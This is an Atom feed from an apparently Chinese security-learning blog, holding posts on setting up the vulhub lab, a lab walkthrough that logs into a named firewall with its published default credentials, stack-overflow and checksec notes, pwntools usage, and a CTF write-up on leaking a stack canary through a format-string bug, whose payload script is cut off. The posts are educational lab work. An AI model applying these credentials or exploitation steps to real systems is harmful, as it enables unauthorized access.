<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Sinky&#39;s Blog</title>
  
  
  <link href="https://sinky.top/atom.xml" rel="self"/>
  
  <link href="https://sinky.top/"/>
  <updated>2022-11-22T08:50:47.344Z</updated>
  <id>https://sinky.top/</id>
  
  <author>
    <name>Sinky</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Kali安装vulhub</title>
    <link href="https://sinky.top/2022/11/21/Kali%E5%AE%89%E8%A3%85vulhub/"/>
    <id>https://sinky.top/2022/11/21/Kali%E5%AE%89%E8%A3%85vulhub/</id>
    <published>2022-11-21T01:23:59.283Z</published>
    <updated>2022-11-22T08:50:47.344Z</updated>
    
    <content type="html"><![CDATA[<p>再搭一个靶场，基于docker和docker-compose的漏洞环境集合。</p><h1 id="安装docker"><a href="#安装docker" class="headerlink" title="安装docker"></a>安装docker</h1><p>切root用户：</p><pre><code class="hljs">apt-get update #更新apt-get install -y apt-transport-https ca-certificates #安装https协议、CA证书apt install docker.io # 安装dockerdocker -v # 查看是否安装成功systemctl start docker # 启动dockerdocker ps -a # 查看docker信息</code></pre><h1 id="安装pip和docker-compose"><a href="#安装pip和docker-compose" class="headerlink" title="安装pip和docker-compose"></a>安装pip和docker-compose</h1><pre><code class="hljs">apt-get install python3-pip # 安装pippip3 install docker-compose # 安装docker-composedocker-compose -v # 查看版本信息</code></pre><h1 id="安装vulhub"><a href="#安装vulhub" class="headerlink" title="安装vulhub"></a>安装vulhub</h1><pre><code class="hljs">git clone https://github.com/vulhub/vulhub.git # 下载vulhubcd vulhub lscd rails/CVE-2019-5418 # 随便进入一个靶场docker-compose up -s # 开启靶场环境</code></pre><p>哦豁，失败，我就说我怎么可能搭建环境这么顺利。<br>切换了root，就可以了，等了好一会儿开启</p><p><img src="https://s2.loli.net/2022/11/22/3uqSHPgRDlUCNpY.png" alt="image.png"></p><p>查看靶场启动环境 <code>docker-compose ps -a</code><br>查看该环境运行的端口</p><p>然后连接一下网址：<code>http://kali的ip:端口/</code></p><p><img src="https://s2.loli.net/2022/11/22/D8ap4yEcRSrixnO.png" alt="image.png"></p><p>关闭环境：<code>docker-compose down</code></p><p><img src="https://s2.loli.net/2022/11/22/jInPGpJxXWTs2cA.png" alt="image.png"></p><p>（这次搭建靶场顺利到不可思议！！！）</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;再搭一个靶场，基于docker和docker-compose的漏洞环境集合。&lt;/p&gt;
&lt;h1 id=&quot;安装docker&quot;&gt;&lt;a href=&quot;#安装docker&quot; class=&quot;headerlink&quot; title=&quot;安装docker&quot;&gt;&lt;/a&gt;安装docker&lt;/h1&gt;&lt;p&gt;</summary>
      
    
    
    
    
    <category term="docker" scheme="https://sinky.top/tags/docker/"/>
    
    <category term="vulhub" scheme="https://sinky.top/tags/vulhub/"/>
    
    <category term="环境搭建" scheme="https://sinky.top/tags/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"/>
    
  </entry>
  
  <entry>
    <title>靶场：某防火墙默认口令</title>
    <link href="https://sinky.top/2022/11/15/%E9%9D%B6%E5%9C%BA%EF%BC%9A%E6%9F%90%E9%98%B2%E7%81%AB%E5%A2%99%E9%BB%98%E8%AE%A4%E5%8F%A3%E4%BB%A4/"/>
    <id>https://sinky.top/2022/11/15/%E9%9D%B6%E5%9C%BA%EF%BC%9A%E6%9F%90%E9%98%B2%E7%81%AB%E5%A2%99%E9%BB%98%E8%AE%A4%E5%8F%A3%E4%BB%A4/</id>
    <published>2022-11-15T05:53:43.820Z</published>
    <updated>2022-11-15T06:38:12.331Z</updated>
    
    <content type="html"><![CDATA[<h1 id="背景介绍"><a href="#背景介绍" class="headerlink" title="背景介绍"></a>背景介绍</h1><p>安全工程师”墨者”对某公司进行授权测试时，扫描公网IP时发现当前公司在网络边界部署了某型号防火墙，并且公网可以访问防火墙的WEB页面。</p><p>实训目标</p><ol><li>掌握查看当前设备类型的方法；</li><li>了解网络（安全）设备的登录控制方式；</li><li>了解网络（安全）设备的默认口令获取方式；</li><li>了解当前型号防火墙的不同账户的区别；</li><li>了解在网络信息安全中的权限最小化、权限分离作用；</li></ol><p>解题方向</p><p>找到防火墙的默认口令进行登录。</p><h1 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h1><p>题目给了一个登录界面，我注意到题目标题：天清汉马，那就百度搜了一下天清汉马防火墙的默认账号密码</p><p>账号：useradmin</p><p>密码：venus.user</p><p>然后……就拿到key了！</p><pre><code class="hljs">KEY: mozhedf5bfbb87e52d81d6c658bda251</code></pre><p>说实话这不值得我花三个币！！！</p><h1 id="拓展-防火墙"><a href="#拓展-防火墙" class="headerlink" title="拓展 防火墙"></a>拓展 防火墙</h1><p>防火墙是指设置在不同网络或网络安全域之间的一系列部件的组合，它可以通过监测、限制、更改跨越防火墙的数据流，尽可能地对外部屏蔽网络内部的信息、结构和运行状况，以此来实现网络的安全保护，在逻辑上，防火墙是一个分离器，一个限制器，也是一个分析器，有效的监控了内部网和Internet之间的任何活动，保证了内部网络的安全。</p><p>防火墙，一个硬件设备或软件系统，主要架设在内部网络和外部网络间，为了防止外界恶意程序对内部系统的破坏，或者组织内部重要信息向外流出，有双向监督的功能。</p><h2 id="防火墙的分类及原理"><a href="#防火墙的分类及原理" class="headerlink" title="防火墙的分类及原理"></a>防火墙的分类及原理</h2><h3 id="包过滤技术"><a href="#包过滤技术" class="headerlink" title="包过滤技术"></a>包过滤技术</h3><p>包过滤技术是一种简单、有效的安全控制技术，它工作在网络层，通过在为网络间相互连接的设备上加载允许、禁止来自某些特定的源地址、目的地址、TCP端口号等规则，对通过设备的数据包进行检查，限制数据包进出内部网络</p><p>包过滤技术的优点是对用户透明，传输性能高，但由于安全控制层次在网络层、传输层，安全控制力度也只限于源地址、目的地址和端口号，因而只能进行较为初步的安全控制。</p><h3 id="应用代理技术"><a href="#应用代理技术" class="headerlink" title="应用代理技术"></a>应用代理技术</h3><p>应用代理防火墙工作在OSI的第七层，它通过检查所有应用层的信息包，并将检查的内容信息放入决策过程，从而提高网络的安全性。</p><p>应用网关防火墙是通过打破客户机/服务器模式实现的。每个客户机/服务器通信需要两个二连接：从客户端到防火墙，从防火墙到服务器。</p><p>另外，每个代理需要一个不同的应用进程，或一个后台运行的服务程序，对每个新的应用必须添加针对此应用的服务程序，否则不能使用该服务</p><p>所以，应用网关防火墙具有可伸缩性差的缺点。</p><h3 id="状态检测技术"><a href="#状态检测技术" class="headerlink" title="状态检测技术"></a>状态检测技术</h3><p>状态检测防火墙工作在OSI的第二至四层，采用状态检测包过滤的技术，是传统包过滤功能扩展而来。状态检测防火墙在网络层有一个检查引擎截获数据包并抽取出与应用层状态有关的信息，并以此为依据决定对该连接是接受还是拒绝，这种技术提供了高度安全的解决方案，同事具有较好的适应性和扩展性。</p><p>状态检测防火墙基本保持了简单包过滤防火墙的优点，性能较好，同时在防火墙的核心部分建立状态连接表，维护了连接，将进出昂罗的数据当成一个个的时间来处理，主要特点是由于缺乏对应用层协议的深度检测功能，无法彻底识别数据包中大量的垃圾邮件、广告以及木马程序等。</p><h3 id="完全内容检测技术"><a href="#完全内容检测技术" class="headerlink" title="完全内容检测技术"></a>完全内容检测技术</h3><p>完全内容检测技术防火墙综合状态检测与应用代理技术，并基于多层检测架构，把防病毒、内容过滤，应用识别等功能整合到防火墙中，还包括IPS功能，在网络边界实施OSI第七层的内容扫描，实现了实时在网络边缘部署病毒防护、内容过滤等应用层服务措施。</p><p>完全内容检测技术防火墙可以检测整个数据包内容，根据需要建立连接状态表，网络层保护强，应用层控制细等有点，但由于功能集成度高，对产品硬件要求较高</p><h2 id="防火墙作用"><a href="#防火墙作用" class="headerlink" title="防火墙作用"></a>防火墙作用</h2><ul><li>保护脆弱的服务：过滤不安全服务，提高网络安全减少主机风险</li><li>控制对系统的访问</li><li>集中的安全管理：在防火墙定义的安全规则可以运行于整个内部网络系统，而无需在内部网每台机器上分别设立安全策略</li><li>增强的保密性：可以阻止攻击者获取攻击网络系统的有用信息</li><li>记录和统计网络利用数据以及非法使用数据</li><li>策略执行：提供了指定和执行网络安全策略的手段。</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;背景介绍&quot;&gt;&lt;a href=&quot;#背景介绍&quot; class=&quot;headerlink&quot; title=&quot;背景介绍&quot;&gt;&lt;/a&gt;背景介绍&lt;/h1&gt;&lt;p&gt;安全工程师”墨者”对某公司进行授权测试时，扫描公网IP时发现当前公司在网络边界部署了某型号防火墙，并且公网可以访问防火墙的W</summary>
      
    
    
    
    
    <category term="墨者学院，靶场，防火墙" scheme="https://sinky.top/tags/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2%EF%BC%8C%E9%9D%B6%E5%9C%BA%EF%BC%8C%E9%98%B2%E7%81%AB%E5%A2%99/"/>
    
  </entry>
  
  <entry>
    <title>栈溢出原理及利用学习</title>
    <link href="https://sinky.top/2022/11/10/%E6%A0%88%E6%BA%A2%E5%87%BA%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8%E5%AD%A6%E4%B9%A0(%E5%BE%85%E8%A1%A5%E5%85%85)/"/>
    <id>https://sinky.top/2022/11/10/%E6%A0%88%E6%BA%A2%E5%87%BA%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8%E5%AD%A6%E4%B9%A0(%E5%BE%85%E8%A1%A5%E5%85%85)/</id>
    <published>2022-11-10T06:02:14.144Z</published>
    <updated>2022-11-14T08:47:42.940Z</updated>
    
    <content type="html"><![CDATA[<h1 id="栈"><a href="#栈" class="headerlink" title="栈"></a>栈</h1><p>数据结构，先进后出，先进的数据压入栈底，最后的数据在栈顶</p><ul><li>Push 将数据压入栈顶</li><li>Pop 将栈顶数据弹出</li></ul><p><img src="https://s2.loli.net/2022/11/11/RHinVQcJfPOgxSk.png" alt="image.png"></p><ul><li>代码段：存放可执行程序的代码，可读不可写</li><li>数据段：存放程序中已经初始化的静态（全局）变量，可读写</li><li>bss段：存放程序中未初始化的静态（全局）变量，可读写</li><li>堆(heap)：存放动态分配的内容，需要程序员手动分配和释放</li><li>栈(stack)：存放局部变量，如函数的参数、返回地址、局部变量等，有系统自动分配和释放</li></ul><h2 id="函数调用栈"><a href="#函数调用栈" class="headerlink" title="函数调用栈"></a>函数调用栈</h2><p>栈增长方向：高-&gt;低</p><p>ESP: 栈指针，指向栈顶低地址</p><p>ESP: 基址指针，指向栈底高地址</p><p>EIP: 指令指针，存储即将执行的程序指令地址</p><h3 id="函数调用约定"><a href="#函数调用约定" class="headerlink" title="函数调用约定"></a>函数调用约定</h3><p>函数调用约定是指当一个函数被调用时，函数的参数会被传递给被调用的函数和返回值会被返回给调用函数，函数的调用约定规定了执行过程中函数的调用者和被调用者之间如何传递参数以及如何恢复栈平衡。</p><p>常用的函数调用约定：</p><pre><code class="hljs">__cdecl # C/C++默认方式，参数从右到左压栈，主调函数负责栈平衡__stdcall # windows API默认方式，参数从右向左入栈，被调函数负责栈平衡__fastcall # 快速调用方式，将参数有限从寄存器(ECX和EDX)传入，其余参数再从右向左从栈传入thiscall # 从右向左入栈，若参数数目固定，则类实例的this指针通过ecx传递给被调函数，被调函数自身清理堆栈，若参数数目补丁，则this指针在所有参数入栈后再入栈，主调函数清理堆栈pascal # 从左向右入栈，支支持固定参数的函数，类型和数量完全可知，被调函数自身清理堆栈，输出的函数名称五任何修饰且全部大写naked call # 编译器不产生保存和恢复寄存器的代码，且不能用return返回返回值，该调用约定用于特殊场合，如声明处于非C/C++上下文中的函数，并由程序员自行编写初始化和清栈的内嵌汇编指令</code></pre><h3 id="函数调用开始"><a href="#函数调用开始" class="headerlink" title="函数调用开始"></a>函数调用开始</h3><p>在调用一个函数时，系统会为函数分配一个栈帧，栈帧空间为该函数独有</p><p>调用者调用函数过程：</p><ul><li>函数参数从右到左入栈</li><li>返回地址入栈</li><li>上一函数ebp入栈</li><li>balabala</li></ul><p>在上一函数ebp入栈后，就开辟了被调函数的新栈帧，然后被调函数临时变量入栈。</p><p>（之前在一本书里学过，但是记得不那么清楚了）</p><h3 id="函数调用结束"><a href="#函数调用结束" class="headerlink" title="函数调用结束"></a>函数调用结束</h3><p>函数调用结束，按照相反顺序将数据弹出栈：</p><ul><li>弹出临时变量</li><li>弹出调用函数的ebp值，存入ebp寄存器中</li><li>弹出返回地址，存在eip寄存器中</li></ul><p>返回地址即是用call指令调用函数时下一条指令的地址，存到eip中</p><h1 id="栈溢出原理"><a href="#栈溢出原理" class="headerlink" title="栈溢出原理"></a>栈溢出原理</h1><p>栈溢出是指向栈中写入超出限定长度的数据，一处的数据覆盖栈中其他数据，从而影响程序运行，当攻击者计算好溢出长度，编写一处数据，用我们想要的地址数据覆盖函数返回地址，那么被调函数调用完返回主函数时，就会跳转到我们覆盖的地址，通过改变程序流程，达到利用的目的。</p><h1 id="调试举例"><a href="#调试举例" class="headerlink" title="调试举例"></a>调试举例</h1><p>栈可以看成一个漏斗，栈底地址大，栈顶地址小，在一个存储单元中，按照由小到大进行存储，它的目的是赋予程序一个额方便的途径来访问特定函数的局部数据，并从函数调用者那边传递信息。</p><p>栈溢出属于缓冲区溢出，指程序向栈中某个变量中写入的字节数超过了这个变量本身所申请的字节数，因而导致与其相邻的栈中的变量的值被改变。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;栈&quot;&gt;&lt;a href=&quot;#栈&quot; class=&quot;headerlink&quot; title=&quot;栈&quot;&gt;&lt;/a&gt;栈&lt;/h1&gt;&lt;p&gt;数据结构，先进后出，先进的数据压入栈底，最后的数据在栈顶&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Push 将数据压入栈顶&lt;/li&gt;
&lt;li&gt;Pop 将栈顶数据弹</summary>
      
    
    
    
    
    <category term="学习笔记" scheme="https://sinky.top/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    <category term="栈溢出" scheme="https://sinky.top/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/"/>
    
    <category term="漏洞" scheme="https://sinky.top/tags/%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>PWN的exp编写学习记录(待学)</title>
    <link href="https://sinky.top/2022/11/10/PWN%E7%9A%84exp%E7%BC%96%E5%86%99%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
    <id>https://sinky.top/2022/11/10/PWN%E7%9A%84exp%E7%BC%96%E5%86%99%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/</id>
    <published>2022-11-10T05:32:42.447Z</published>
    <updated>2022-11-10T06:17:07.557Z</updated>
    
    
    
    
    
    <category term="PWN" scheme="https://sinky.top/tags/PWN/"/>
    
    <category term="exp" scheme="https://sinky.top/tags/exp/"/>
    
  </entry>
  
  <entry>
    <title>PWN常用脚本语句解释</title>
    <link href="https://sinky.top/2022/11/10/PWN%E5%B8%B8%E7%94%A8%E8%84%9A%E6%9C%AC%E8%AF%AD%E5%8F%A5%E8%A7%A3%E9%87%8A/"/>
    <id>https://sinky.top/2022/11/10/PWN%E5%B8%B8%E7%94%A8%E8%84%9A%E6%9C%AC%E8%AF%AD%E5%8F%A5%E8%A7%A3%E9%87%8A/</id>
    <published>2022-11-10T01:15:38.991Z</published>
    <updated>2022-11-10T02:39:27.016Z</updated>
    
    <content type="html"><![CDATA[<h1 id="接收远端传回的数据"><a href="#接收远端传回的数据" class="headerlink" title="接收远端传回的数据"></a>接收远端传回的数据</h1><pre><code class="hljs">interactive(): 在取得shell之后使用，直接进行交互，相当于回到shell的模式recv(numb=字节大小,timeout=default): 接收指定字节数recvall(): 一直接收直到达到文件EOFrecvline(keepends=True): 接收一行，keepends为是否保留行尾的\nrecvuntil(delims,drop=False): 一直读到delims的pattern出现为止recvrepeat(timeout=default): 持续接收直到EOF或timeout</code></pre><h1 id="向远端发送数据"><a href="#向远端发送数据" class="headerlink" title="向远端发送数据"></a>向远端发送数据</h1><pre><code class="hljs">send(data): 发送数据sendline(data): 发送一行数据，相当于在数据末尾加\nsendlineafter("字符串",data): 在这一串字符串结束之后发送datash.send(data): 进行数据发送，不一定是一行数据</code></pre><blockquote><p>send和sendline的区别是：sendline多发送了一次回车</p></blockquote><pre><code class="hljs">from pwn import * # 将所用模块导入到当前namespaceio=process('./pwn123') # 本地，与文件进行交互 使用了process，结尾要加interactive才能完成交互过程r=remote("xx.xx.xx.xx(注：ip)"，端口号) # 远程，连接指定IP及端口关闭远程连接使用 sh.close()r.recvuntil("字符串") # 运行到字符串位置停下r.sendline(payload) # 发送payloadcontext.log_level="debug" # 脚本在执行时就会输出debug的信息，可以通过观察这些信息查找出错点或者 contex(arch='amd64',os='linux',log_level='debug')gdb.attach(io)pause() # 对脚本进行调试</code></pre><ul><li>打包数据：p64()或p32() </li><li>解包数据：u64()或u32()</li></ul><p>bin文件操作：</p><pre><code class="hljs">elf=ELF("binfilepath")libc=ELF("libcpath")</code></pre><p>得到程序bss段的起始位置：<code>bss_base_addr=elf.bss()</code></p><ul><li>PLT  <code>write_plt=elf.plt["write"]</code></li><li>GOT  <code>write_plt=elf.got["write"]</code></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;接收远端传回的数据&quot;&gt;&lt;a href=&quot;#接收远端传回的数据&quot; class=&quot;headerlink&quot; title=&quot;接收远端传回的数据&quot;&gt;&lt;/a&gt;接收远端传回的数据&lt;/h1&gt;&lt;pre&gt;&lt;code class=&quot;hljs&quot;&gt;interactive(): 在取得she</summary>
      
    
    
    
    
    <category term="PWN" scheme="https://sinky.top/tags/PWN/"/>
    
  </entry>
  
  <entry>
    <title>pwn之checksec学习</title>
    <link href="https://sinky.top/2022/11/08/pwn%E4%B9%8Bchecksec%E5%AD%A6%E4%B9%A0/"/>
    <id>https://sinky.top/2022/11/08/pwn%E4%B9%8Bchecksec%E5%AD%A6%E4%B9%A0/</id>
    <published>2022-11-08T08:37:25.377Z</published>
    <updated>2022-11-09T01:19:01.891Z</updated>
    
    <content type="html"><![CDATA[<p>我忘记了之前有没有写关于这个的笔记，反正我都不记得了，所以再学一遍！</p><p>checksec主要用于查看题目开启了哪些保护机制。</p><h1 id="Arch"><a href="#Arch" class="headerlink" title="Arch"></a>Arch</h1><p>程序架构信息，判断是64位还是32位</p><h1 id="RELRO"><a href="#RELRO" class="headerlink" title="RELRO"></a>RELRO</h1><p>主要针对GOT改写的攻击方式，分为Partial RELRO和Full RELRO。</p><p>Partial RELRO：表示got表可写，容易受到攻击</p><p>Full RELRO：表示got表不可写，只读，无法被覆盖，会增加程序启动时间</p><h1 id="Stack-canary"><a href="#Stack-canary" class="headerlink" title="Stack-canary"></a>Stack-canary</h1><p>Canary翻译为金丝雀，应用于在栈保护上是在初始化一个栈帧时在栈底设置一个随机的canary值，当函数返回时监测canary是否改变，以此判断stack/buffer overflow是否发生，改变则说明栈溢出发生，程序走另一个流程结束一面漏洞利用成功，因此我们需要获取canary值或防止出发stack_chk_fall函数。</p><pre><code class="hljs">gcc -fno-stack-protector -o hello test.c   //禁用栈保护gcc -fstack-protector -o hello test.c    //启用堆栈保护，不过只为局部变量中含有 char 数组的函数插入保护代码gcc -fstack-protector-all -o hello test.c  //启用堆栈保护，为所有函数插入保护代码</code></pre><h1 id="NX"><a href="#NX" class="headerlink" title="NX"></a>NX</h1><p>NX enable 可不执行内存</p><p>最常见方法为ROP,利用栈溢出在栈上布置地址，每个内存地址对应一个gadget，利用ret等指令进行衔接来执行某项功能，最终达到pwn掉程序的目的。</p><p>gcc默认开启NX选项。</p><p>这个保护开启就是意味着栈中数据没有执行权限，如此一来, 当攻击者在堆栈上部署自己的 shellcode 并触发时, 只会直接造成程序的崩溃，但是可以利用rop这种方法绕过</p><h1 id="PIE"><a href="#PIE" class="headerlink" title="PIE"></a>PIE</h1><p>位置无关可执行文件，地址空间分布随机化</p><p>与ASLR类似，将程序运行时的对堆栈以及共享库的加载地址随机化，而PIE技术则在编译时将程序编译为位置无关，即程序运行时各个段加载的虚拟地址也是在装载时才确定，在PIE和ASLR同时开启时攻击者将对程序的内存布局一无所知，got表方法也难以进行，无法获取程序.got表的虚地址。</p><pre><code class="hljs">0 - 表示关闭进程地址空间随机化。1 - 表示将mmap的基址，stack和vdso页面随机化。2 - 表示在1的基础上增加栈（heap）的随机化。</code></pre><p>（据说除了新版checksec，但是我没安装呢）</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;我忘记了之前有没有写关于这个的笔记，反正我都不记得了，所以再学一遍！&lt;/p&gt;
&lt;p&gt;checksec主要用于查看题目开启了哪些保护机制。&lt;/p&gt;
&lt;h1 id=&quot;Arch&quot;&gt;&lt;a href=&quot;#Arch&quot; class=&quot;headerlink&quot; title=&quot;Arch&quot;&gt;&lt;/</summary>
      
    
    
    
    
    <category term="pwn" scheme="https://sinky.top/tags/pwn/"/>
    
    <category term="checksec" scheme="https://sinky.top/tags/checksec/"/>
    
  </entry>
  
  <entry>
    <title>攻防世界-Mary_Morton</title>
    <link href="https://sinky.top/2022/11/08/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-Mary_Morton/"/>
    <id>https://sinky.top/2022/11/08/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-Mary_Morton/</id>
    <published>2022-11-08T08:24:16.075Z</published>
    <updated>2022-11-10T05:30:42.846Z</updated>
    
    <content type="html"><![CDATA[<p>9命，太久没做pwn了，我连最基本的一些工具都忘记了，完全都不记得pwn怎么打了，我好菜，从头开始！</p><h1 id="查文件"><a href="#查文件" class="headerlink" title="查文件"></a>查文件</h1><ol><li>file查看文件属性，elf64位文件</li><li>checksec查看保护机制</li></ol><p><img src="https://s2.loli.net/2022/11/08/A87ktmN1Sy5g9QJ.png" alt="image.png"></p><p>64位文件；</p><p>开启了Partial RELRO，表示got表可写；</p><p>开启了NX，栈不可执行；</p><p>无PIE；</p><p>开启了canary，不能直接栈溢出覆盖返回地址，因为在初始化一个栈帧时在栈底设置一个随机的canary值，函数返回之时会检测canary是否改变。</p><p>运行程序</p><p><img src="https://s2.loli.net/2022/11/09/WlYMdrTOVoR5kvD.png" alt="image.png"></p><p>1-栈溢出漏洞；2-格式化字符串漏洞；3-退出</p><h1 id="IDA分析"><a href="#IDA分析" class="headerlink" title="IDA分析"></a>IDA分析</h1><p>IDA打开找到main函数：</p><figure class="highlight awk"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs awk">void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)<br>{<br>  int v3; <span class="hljs-regexp">//</span> [sp+<span class="hljs-number">24</span>h] [bp-Ch]@<span class="hljs-number">2</span><br>  __int64 v4; <span class="hljs-regexp">//</span> [sp+<span class="hljs-number">28</span>h] [bp-<span class="hljs-number">8</span>h]@<span class="hljs-number">1</span><br>  v4 = *MK_FP(__FS__, <span class="hljs-number">40</span>LL);<br>  sub_4009FF();<br>  puts(<span class="hljs-string">"Welcome to the battle ! "</span>);<br>  puts(<span class="hljs-string">"[Great Fairy] level pwned "</span>);<br>  puts(<span class="hljs-string">"Select your weapon "</span>);<br>  <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>  {<br>    <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>    {<br>      sub_4009DA();<br>      __isoc99_scanf(<span class="hljs-string">"%d"</span>, &amp;v3);                <span class="hljs-regexp">//</span> 选择项 <span class="hljs-number">1</span>，<span class="hljs-number">2</span>，<span class="hljs-number">3</span><br>      <span class="hljs-keyword">if</span> ( v3 != <span class="hljs-number">2</span> )<br>        <span class="hljs-keyword">break</span>;<br>      sub_4008EB();                             <span class="hljs-regexp">//</span> printf 格式化字符串<br>    }<br>    <span class="hljs-keyword">if</span> ( v3 == <span class="hljs-number">3</span> )<br>    {<br>      puts(<span class="hljs-string">"Bye "</span>);<br>      <span class="hljs-keyword">exit</span>(<span class="hljs-number">0</span>);<br>    }<br>    <span class="hljs-keyword">if</span> ( v3 == <span class="hljs-number">1</span> )<br>      sub_400960();                             <span class="hljs-regexp">//</span> 触发canary，含栈溢出<br>    <span class="hljs-keyword">else</span><br>      puts(<span class="hljs-string">"Wrong!"</span>);<br>  }<br>}<br></code></pre></td></tr></tbody></table></figure><p>格式化字符串：</p><figure class="highlight reasonml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">__int64 sub<span class="hljs-constructor">_4008EB()</span><br>{<br>  <span class="hljs-built_in">char</span> buf; <span class="hljs-comment">// [sp+0h] [bp-90h]@1</span><br>  __int64 v2; <span class="hljs-comment">// [sp+88h] [bp-8h]@1</span><br>  v2 = *<span class="hljs-constructor">MK_FP(<span class="hljs-params">__FS__</span>, 0x28LL)</span>;                  <span class="hljs-comment">// 从位置FS:[0x28u]读取双字内容</span><br>  memset(&amp;buf, <span class="hljs-number">0</span>, <span class="hljs-number">0x80</span>uLL);<br>  read(<span class="hljs-number">0</span>, &amp;buf, <span class="hljs-number">0x7F</span>uLL);<br>  printf(&amp;buf, &amp;buf);<br>  return *<span class="hljs-constructor">MK_FP(<span class="hljs-params">__FS__</span>, 40LL)</span> ^ v2;<br>}<br></code></pre></td></tr></tbody></table></figure><p>栈溢出：</p><figure class="highlight perl"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs perl">__int64 sub_40096<span class="hljs-number">0</span>()<br>{<br>  char buf; <span class="hljs-regexp">//</span> [sp+0h] [bp-<span class="hljs-number">90</span>h]@1<br>  __int64 v2; <span class="hljs-regexp">//</span> [sp+<span class="hljs-number">88</span>h] [bp-<span class="hljs-number">8</span>h]@1<br>  v2 = *MK_FP(__FS_<span class="hljs-number">_</span>, <span class="hljs-number">0x28</span>LL);                  <span class="hljs-regexp">//</span> canary标志<br>  memset(&amp;buf, <span class="hljs-number">0</span>, <span class="hljs-number">0x80</span>uLL);<br>  <span class="hljs-keyword">read</span>(<span class="hljs-number">0</span>, &amp;buf, <span class="hljs-number">0x100</span>uLL);                      <span class="hljs-regexp">//</span> 栈溢出<br>  <span class="hljs-keyword">printf</span>(<span class="hljs-string">"-&gt; %s\n"</span>, &amp;buf);<br>  <span class="hljs-keyword">return</span> *MK_FP(__FS_<span class="hljs-number">_</span>, <span class="hljs-number">40</span>LL) ^ v2;<br>}<br></code></pre></td></tr></tbody></table></figure><p>查看流程图：</p><p><img src="https://s2.loli.net/2022/11/09/tFhGesgyKAc3CYm.png" alt="image.png"></p><p>分析可知<code>v2 = *MK_FP(__FS__, 0x28LL);</code>有canary保护，只有rax与fs:28h相等，才能跳转到返回值，反之则调用<code>stak_chk_fail</code></p><p>查看字符串发现有 cat flag:</p><p><img src="https://s2.loli.net/2022/11/09/ftOmIBaWVwlAzcN.png" alt="image.png"></p><p>地址：<code>0x4008DA</code></p><p>思路：</p><p>利用字符串漏洞泄露canary值，在函数返回的时候再填回去，然后利用栈溢出让其返回后门函数。</p><p>（我的IDA不知道为什么解析不出来这个函数体，不过应该问题不大）</p><h1 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h1><p>先测一下字符串漏洞的偏移，payload一般为：</p><pre><code class="hljs">AAAA-%x-%x-%x-%x…</code></pre><p><img src="https://s2.loli.net/2022/11/09/fhgGbe9mZs5oNI4.png" alt="image.png"></p><p>偏移了6个字节。</p><p>canary与输入参数之间的偏移：</p><p><img src="https://s2.loli.net/2022/11/09/sDH8EhMNtwgQB29.png" alt="image.png"></p><p>计算泄露特定地址的payload一般构造为</p><pre><code class="hljs">(target_addr - start_addr + offset) / address_bytes_length（64位为8，32位为4）</code></pre><p>buf和v2相差： 0x90-0x8=0x88,0x88/8=17,17+6=23</p><ul><li>64位程序，一个字符占8字节（32位是4字节），所以buf和v2相差0x88，转十进制为136，除以8，即相差17个字节</li><li>由于buf是格式化字符串的第6个参数，所以v2是格式化字符串的第17+6=23个参数。</li></ul><h2 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h2><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span 